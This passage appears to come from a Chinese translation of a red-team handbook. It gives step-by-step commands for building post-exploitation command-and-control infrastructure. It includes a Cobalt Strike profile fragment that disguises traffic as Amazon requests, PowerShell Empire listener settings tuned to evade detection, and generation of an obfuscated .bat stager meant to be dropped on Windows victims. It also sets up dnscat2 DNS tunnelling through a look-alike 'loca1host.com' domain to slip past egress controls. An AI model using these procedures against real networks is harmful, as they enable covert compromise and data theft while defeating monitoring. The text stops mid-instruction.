化的 IRC 客户端和机器人。开发它的目的有两个：
set uri “/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books”;
header “Host” “www.amazon.com”;
header “x-amz-id-1” “THKUYEZKCKPGY5T42PZT”;
header “x-amz-id-2” “a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2t
1. 你可以创建长时间运行的机器人来模拟虚拟红队成员，并与你并肩进行黑客攻击
2. 你还可以根据你的需要使用它来扩展和修改 Cobalt Strike 客户端的功能 官方介绍页面：https://www.cobaltstr
ike.com/aggressor-script/index.html
例子：HarleyQu1nn 将不同的 Aggressor 脚本放在一个项目中提供给你用于后续漏洞利用： http://bit.ly/2qxIwPE
PowerShell Empire
Empire 是一个后期漏洞利用的框架，包含一个纯 PowerShell2.0 的 Windows 代理和一个纯 Python 2.6/2.7 的
Linux/OS X 代理。它是以前的 PowerShell Empire 和 Python EmPyre 项目的合并。 该框架提供了加密安全通信和
灵活的架构。在 PowerShell 方面，Empire 实现了无需 powershell.exe 就可运行 PowerShell 代理的功能。并且
Empire 有很多可以快速部署的后期漏洞利用模块，从键盘记录器到 Mimikatz。Empire 还可以调整通信，躲避网络
检测。所有的这些功能都封装在一个以实用性为重点的 框架中。
对于红队人员来说，PowerShell 是我们最好的朋友之一。在初始化有效 payload 之后，所有随后的攻击都保存在内
存中。Empire 最好的地方就是它被开发者积极地维护和更新中，以便你可以使用最新的后期漏洞利用模块进行攻
击。 它们还具有适用于 Linux 和 OS X 的 C2 连接。因此，你仍然可以创建基于 MAC 的 Oﬃce 宏，当执行之后，在
Empire 中拥有一个全新的代理。
我们将通过本书更详细地介绍 Empire，以便你了解它的威力如何。在设置 Empire 方面，确保你已安全地配置它非
常重要：
将证书路径 CertPath 设置为一个真实可信的 SSL 证书。
更改 DefaultProﬁle 端点。许多第7层防火墙都在寻找确切的静态端点。
更改用于通信的用户代理。
在前两版书中我们提过，Metasploit 的源文件用于自动化，Empire 现在也支持自动运行的脚本，这样可以提高效
率。
运行 Empire：
初始化 Empire
退出
安装证书（最好是使用真实受信任的证书）
开始运行 Empire
创建一个监听器
cd /opt/Empire && ./setup/reset.sh
exit
./setup/cert.sh
./empire
listeners
选择你的监听器类型（我们实验使用的是 HTTP）
查看监听器的全部配置信息
设置以下内容（即设置KillDate 12/12/2020）
当你完成所有这些，开启你的监听器
配置 Payload
payload 是将在受害者系统上运行的实际恶意软件。 这些 payload 可以在 Windows，Linux 和 OSX 中运行，但
Empire 以其基于 PowerShell Windows 的 Payload 而闻名：
uselistener [按两次 tab 键来查阅所有类型的监听器]
uselistener http
info
KillDate - 规定一个结束时间然后自动清理代理
DefaultProfile - 确保更改所有端点（即/admin/get.php,/news.php）。你可以根据需要制作它们，例
如/seriously/notmalware.php
DefaultProfile - 确保也更改你的用户代理。 我一般是查看使用过的顶级用户代理并选择从中选择一个。
Host - 更改为通过端口443的 HTTPS
CertPath - 添加 SSL 证书的路径
UserAgent - 将其更改为你的常用用户代理
Port - 设置为443
ServerVersion - 将其更改为另一个常见的服务器 Header
execute
进入主菜单
为 OSX，Windows，Linux 创建可用的 stager。 我们将创建一个简单的 bat 文件作为示例，但实际上你可以为
Oﬃce 文件创建宏或者为一个 USB 橡皮鸭创建 payload（译者注： USB 橡皮鸭/USB RUBBER DUCKY 是最早
的按键注入工具）
查看所有设置
配置所有 Settings
创建 Payload
在另一个终端窗口中查看你的 payload
如你所见，创建的 payload 被严重混淆。 你现在可以把这个 .bat 文件丢到任何 Windows 系统上。 当然，你可能会
创建一个 Oﬃce 宏文件或一个USB橡皮鸭（注：USB RUBBER DUCKY/USB 橡皮鸭是最早的按键注入工具）的
payload，但这只是众多示例中的一个。
如果你尚未在 Kali 图形界面上安装 PowerShell，那么最好的方法是手动安装它。 在 Kali 上安装 PowerShell：
main
usestager [按两次tab键来查阅所有不同的类型]
usestager windows/launcher_bat
info
http 把 Listener 设置为 http
配置 UserAgent(用户代理)
generate
cat /tmp/launcher.bat
dnscat2
内网出口一般对出站流量做了严格限制，但是通常不会限制 DNS 请求，也就是 UDP 53 请求。dnscat2 就是一款利
用 DNS 协议创建加密 C2 隧道来控制服务器的工具，所以说这种隧道几乎在每个网络中都可以使用。dnscat2 由客
户端和服务端两部分组成。
基于 DNS 的 C2 服务器连接的渗透方案提供了一种很好的机制来隐藏你的流量，规避网络传感器并绕过网络限制。
在许多限制性环境或生产环境中，我们遇到的网络要么直接不允许出站流量，要么流量也会被严格的限制或监控。为
了绕过这些保护，我们可以使用像 dnscat2 这样的工具。我们关注 dnscat2 的原因是因为它不需要 root权限就允许
shell访问和数据传输。
在许多安全环境中，直接使用 UDP 或 TCP 出站会受到限制。 为什么不利用基础架构中已经内置的服务呢？许多受保
护的网络包含一个 DNS 服务器来解析内部主机，同时还允许解析外部资源。通过为我们拥有的恶意域名设置一个权
威服务器，我们可以利用这些 DNS 解析来对我们的恶意软件进行命令执行和控制。
在我们的场景中，我们将设置名为 “loca1host.com” 的攻击者域。 我们希望通过对 “localhost” 创建“分身”来更多地
隐藏我们的流量。请你自行将 “loca1host.com” 替换为你拥有的域名。我们将配置 loca1host.com 的 DNS 信息，使
其成为一个权威 DNS 服务器(Authoritative DNS server)。 在这个例子中，我们将使用 GoDaddy 的 DNS 配置工
具，但你也可以换成任何其他的 DNS 服务。
apt-get install libunwind8
wget http://security.debian.org/debian-
security/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
dpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
wget http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-7ubuntu0.3_amd64.deb
dpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb
wget https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.2-
1.ubuntu.16.04_amd64.deb
dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb
使用GoDaddy设置一个权威DNS服务器
首先，确保将一台 VPS 服务器设置为你的 C2 攻击服务器并获取了该服务器的 IP。
在 GoDaddy 网站购买域名后，登录你的 GoDaddy（或其他类似的）帐户。
选择你的域，单击“管理”，然后选择“高级 DNS”。
先设置两条 A 记录指向你的 VPS 的 IP
ns1 (然后输入你的VPS的IP) 
ns2 (然后输入你的VPS的IP) 
然后设置自定义 NS 记录
添加 ns1.loca1host.com 
添加 ns2.loca1host.com 
如上图所示，我们现在让我们的 NS 记录指向 ns1.loca1host.com 和 ns2.loca1host.com，它们都指向我们的攻击
VPS 服务器的 IP。 如果你尝试解析 loca1host.com 的任何子域（即 vpn.loca1host.com），它将尝试使用我们的
VPS 进行相关的域名解析。对我们来说幸运的是，dnscat2 在 UDP 端口53上监听并为我们做了所有繁重的工作。
接下来，我们将需要完全设置充当我们的自定义域名解析服务器的攻击服务器。初始化并设置 dnscat2 服务器：
sudo su - 
apt-get update 
apt-get install ruby-dev 
git clone https://github.com/iagox86/dnscat2.git 
cd dnscat2/server/ 
apt-get install gcc make 
gem install bundler 
bundle install 
请测试确认以下脚本能够正常运行: ruby ./dnscat2.rb 
备注: 如果你使用的是 Amazon Lightsail，请确保安全组设置中允许 UDP 端口53 
对于客户端的代码，我们需要将其编译为 Linux 支持执行的二进制文件。
编译客户端
git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client 
cd /opt/dnscat2/client/ 
make 
我们现在应该创建一个 dnscat 二进制文件！ 
(如果你在 windows 环境下编译，需要将 client/win32/dnscat2.vcproj 加载到 Visual Studio 并点击 
“build” ) 
现在我们已经配置好了权威 DNS，我们的攻击服务器作为一个 DNS 服务器正在运行 dnscat2，并且我们已经编译了
恶意软件。我们已经准备好在目标机器中执行我们的 payload。
在开始之前，我们需要在攻击服务器上启动 dnscat2。要启用多个配置，其中的主要配置是配置那个 -secret  标志
来确保我们在 DNS 请求中的通信是加密的。另外，一定要更换我上面用于演示的 loca1host.com 域名，使用你自己
拥有的域名并创建随机密钥字符串。
在你的攻击服务器中启用 dnscat2: